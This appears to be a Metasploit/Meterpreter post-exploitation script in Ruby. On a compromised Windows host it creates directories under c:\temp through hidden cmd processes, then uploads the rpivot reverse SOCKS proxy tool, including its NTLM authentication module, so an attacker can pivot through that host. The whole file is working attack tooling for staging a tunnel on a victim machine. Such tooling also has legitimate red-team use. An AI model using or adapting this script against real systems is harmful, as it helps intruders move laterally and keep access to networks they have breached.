# Uploads rpivot (within the /opt/rpivot directory)
# Rpivot project: https://github.com/klsecservices/rpivot
# Usage details can be found there
# This is a reverse socks proxy solution written in python

# Upload files
def upload(session,file,file_name,path,trgloc = nil)
    if not ::File.exists?(file)
            raise "File to Upload does not exist!"
        else
        if trgloc == nil
        location = session.fs.file.expand_path(path)
        else
            location = trgloc
        end
        begin
            fileontrgt = "#{path}#{file_name}"
            print_status("Uploading #{file} to #{path}")
            session.fs.file.upload_file("#{fileontrgt}","#{file}")
            print_status("#{file} uploaded!")
        rescue ::Exception => e
            print_status("Error uploading file #{file}: #{e.class} #{e}")
        end
    end
    return fileontrgt
end

# Create Directories
r = session.sys.process.execute('cmd /c mkdir "c:\temp"', nil, {'Hidden' => true, 'Channelized' => true})
r = session.sys.process.execute('cmd /c mkdir "c:\temp\rpivot"', nil, {'Hidden' => true, 'Channelized' => true})
r = session.sys.process.execute('cmd /c "mkdir c:\temp\rpivot\ntlm_auth"', nil, {'Hidden' => true, 'Channelized' => true})

# rpivot
Dir.foreach('/opt/rpivot') do |item|
  next if item == '.' or item == '..' or item == 'ntlm_auth'
  upload(client,"/opt/rpivot/#{item}",item,"c:\\temp\\rpivot\\")
end

Dir.foreach('/opt/rpivot/ntlm_auth') do |item|
  next if item == '.' or item == '..'
  upload(client,"/opt/rpivot/ntlm_auth/#{item}",item,"c:\\temp\\rpivot\\ntlm_auth\\")
end
